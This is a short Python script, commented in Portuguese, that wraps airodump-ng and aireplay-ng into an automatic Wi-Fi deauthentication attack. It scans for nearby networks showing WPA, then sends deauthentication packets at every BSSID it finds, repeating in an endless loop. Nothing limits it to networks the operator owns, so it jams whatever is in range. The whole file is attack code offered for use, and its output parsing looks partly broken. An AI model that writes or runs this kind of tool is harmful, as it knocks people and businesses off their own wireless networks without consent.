import os
import subprocess
from time import sleep, time
import sys

def start_aireplay(interface, target_bssid):
    # Inicia o ataque de desautenticação usando a mesma interface
    command = f'aireplay-ng --deauth 30 -a {target_bssid} {interface}'
    os.system(command)

def get_target_bssids(interface):
    # Executa o airodump-ng para encontrar BSSIDs
    process = subprocess.Popen(['airodump-ng', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    bssids = set()
    start_time = time()
    
    try:
        while time() - start_time < 30:  # Escaneia por 30 segundos
            output = process.stdout.readline().decode()
            if "WPA" in output:  # Verifica redes com criptografia WPA ou WEP
                parts = output.split(' ')
                if len(parts) > 1:
                    bssid = parts[1]
                    bssids.add(bssid)
            sleep(0.5)

        process.terminate()  # Termina o processo após o timeout
        return bssids

    except KeyboardInterrupt:
        process.terminate()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python script.py <interface>")
        sys.exit(1)

    interface = sys.argv[1]

    while True:
        try:
            print("Iniciando o scan de redes...")
            target_bssids = get_target_bssids(interface)

            if target_bssids:
                for target_bssid in target_bssids:
                    print(f"Target BSSID encontrado: {target_bssid}")
                    print("Ataque de desautenticação iniciado.")
                    start_aireplay(interface, target_bssid)
                    sleep(1)  # Espera um segundo antes de atacar a próxima rede

            else:
                print("Nenhum alvo adequado encontrado.")

            sleep(1)  # Espera um segundo antes do próximo escaneamento

        except KeyboardInterrupt:
            print("Encerrando o script...")
            sys.exit(0)
